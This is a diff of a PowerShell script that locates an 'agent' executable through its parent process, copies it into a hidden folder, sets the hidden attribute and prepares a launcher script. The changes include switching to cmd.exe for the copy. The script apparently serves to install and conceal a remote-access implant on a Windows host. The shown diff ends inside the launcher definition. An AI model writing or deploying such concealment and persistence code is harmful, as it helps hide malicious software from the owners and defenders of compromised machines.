@@ -2,7 +2,7 @@ $ProgressPreference = 'Continue'
 $ErrorActionPreference = 'Stop'
 
 # -------------------------------------------------------------------
-# Function to get the agent path automatically (returns only the path)
+# Function to get the agent path automatically (returns ONLY the path)
 # -------------------------------------------------------------------
 function Get-AgentPath {
     # 1. Try environment variable first
@@ -13,7 +13,7 @@ function Get-AgentPath {
 
     # 2. Find parent process (the agent that launched this PowerShell)
     try {
-        $parentPid = (Get-CimInstance -Class Win32_Process -Filter "ProcessId=$pid" | Select-Object -ExpandProperty ParentProcessId)
+        $parentPid = (Get-CimInstance -Class Win32_Process -Filter "ProcessId=$PID" | Select-Object -ExpandProperty ParentProcessId)
         if ($parentPid) {
             $parentPath = (Get-Process -Id $parentPid -ErrorAction Stop).Path
             if ($parentPath -and (Test-Path $parentPath)) {
@@ -64,12 +64,12 @@ if (-not (Test-Path $hideDir)) {
     Write-Host "[+] Created hidden folder: $hideDir"
 }
 
-# --- 2. Copy agent to hidden folder ---
+# --- 2. Copy agent using cmd.exe (bypasses PowerShell path issues) ---
 $agentFile = "$hideDir\agent.exe"
 if (Test-Path $agentFile) {
-    Remove-Item -Path $agentFile -Force -ErrorAction SilentlyContinue
+    Remove-Item -Path $agentFile -Force
 }
-Copy-Item -LiteralPath $agentPath -Destination $agentFile -Force
+& cmd.exe /c copy /Y "$agentPath" "$agentFile" 2>&1 | Out-Null
 if (-not (Test-Path $agentFile)) {
     Write-Output "ERROR: Failed to copy agent to $agentFile"
     exit 1
@@ -77,7 +77,7 @@ if (-not (Test-Path $agentFile)) {
 attrib +h $agentFile
 Write-Host "[+] Agent copied to: $agentFile ($((Get-Item $agentFile).Length) bytes)"
 
-# --- 3. Launcher script (just runs the exe) ---
+# --- 3. Launcher script ---
 $launcherPath = "$hideDir\run.ps1"
 $launcherContent = @"
 `$ProgressPreference = 'SilentlyContinue'
